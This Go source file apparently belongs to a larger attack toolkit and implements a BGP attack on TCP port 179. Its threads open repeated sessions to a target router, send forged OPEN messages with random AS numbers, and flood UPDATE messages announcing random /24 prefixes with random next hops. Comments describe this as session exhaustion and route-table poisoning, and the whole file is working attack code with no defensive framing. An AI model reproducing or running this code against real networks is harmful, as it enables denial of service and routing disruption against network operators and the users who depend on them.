// bgp_attack.go — BGP Hijacking via TCP session flood on port 179.
// Real RFC 4271 message construction: OPEN + UPDATE (prefix storm) + KEEPALIVE.
// No simulation — real TCP connections, real RFC-compliant BGP PDUs.
package main

import (
	"encoding/binary"
	"fmt"
	mrand "math/rand"
	"runtime"
	"sync"
	"time"
	"context"
)

const bgpPort = 179

func bgpMsgOptimized(msgType byte, body []byte, buf []byte) []byte {
	total := 19 + len(body)
	// Marker (16 bytes of 0xFF)
	for i := 0; i < 16; i++ {
		buf[i] = 0xFF
	}
	buf[16] = byte(total >> 8)
	buf[17] = byte(total)
	buf[18] = msgType
	if len(body) > 0 {
		copy(buf[19:], body)
	}
	return buf[:total]
}

// startBGPHijack implements a full BGP session exhaustion + route-table poisoning attack.
func startBGPHijack(ctx context.Context, opts ContextOpts, targetIP string, threads int, duration time.Duration, pps int) {
	fmt.Printf("[BGP] Hijacking BGP on %s:%d | threads=%d | dur=%v | max_pps=%d\n",
		targetIP, bgpPort, threads, duration, pps)

	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in BGP: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := mrand.NewSource(time.Now().UnixNano() + int64(id))
			localRand := mrand.New(src)

			bgpBuf := make([]byte, 4096)
			msgBuf := make([]byte, 2048)

			for {
				select {
				case <-ctx.Done():
					return
				default:
					if pps > 0 {
						time.Sleep(time.Second / time.Duration(pps/threads+1))
					}
				}

				conn, err := opts.NetTarget.DialTimeout("tcp",
					fmt.Sprintf("%s:%d", targetIP, bgpPort), 3*time.Second)
				if err != nil {
					time.Sleep(100 * time.Millisecond)
					continue
				}
				
				// Zero-Allocation OPEN
				as := uint16(localRand.Intn(65534) + 1)
				openBody := msgBuf[:10]
				openBody[0] = 4 // Version 4
				binary.BigEndian.PutUint16(openBody[1:], as)
				binary.BigEndian.PutUint16(openBody[3:], 90) // Hold Time
				binary.BigEndian.PutUint32(openBody[5:], localRand.Uint32()) // BGP ID
				openBody[9] = 0 // Opt Params

				openPkt := bgpMsgOptimized(1, openBody, bgpBuf)
				conn.Write(openPkt)
				AddStats(1, int64(len(openPkt)))

				// 2026: Wait for server's OPEN to reach Established (RFC 4271 requires OPEN exchange)
				readBuf := make([]byte, 1024)
				conn.SetReadDeadline(time.Now().Add(2 * time.Second))
				conn.Read(readBuf) 

				// Step 2: Immediate UPDATE flood — prefix storm
				for j := 0; j < 1000; j++ {
					select {
					case <-ctx.Done():
						conn.Close()
						return
					default:
					}
					
					// Optimized Update Message construction
					// NLRI (random /24)
					nlri := msgBuf[500:503]
					nlri[0] = 24
					localRand.Read(nlri[1:])
					
					// Pre-calculated static attributes for speed
					attrBuf := msgBuf[100:200]
					// ORIGIN (type 1)
					copy(attrBuf[0:4], []byte{0x40, 0x01, 0x01, 0x00})
					// NEXT_HOP (type 3)
					copy(attrBuf[4:7], []byte{0x40, 0x03, 0x04})
					localRand.Read(attrBuf[7:11])
					
					// Assemble body: Withdrawn=0 (2 bytes), AttrLen=11 (2 bytes), Attrs, NLRI
					updateHeader := msgBuf[0:4]
					binary.BigEndian.PutUint16(updateHeader[0:], 0)     // Withdrawn length
					binary.BigEndian.PutUint16(updateHeader[2:], 11)    // Attr length
					
					body := msgBuf[300:300] // Reuse slice pointer
					body = append(body, updateHeader...)
					body = append(body, attrBuf[:11]...)
					body = append(body, nlri...)

					upd := bgpMsgOptimized(2, body, bgpBuf)
					if _, err := conn.Write(upd); err != nil {
						break
					}
					AddStats(1, int64(len(upd)))
				}
				conn.Close()
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	fmt.Println("[BGP] BGP Hijack finished")
}
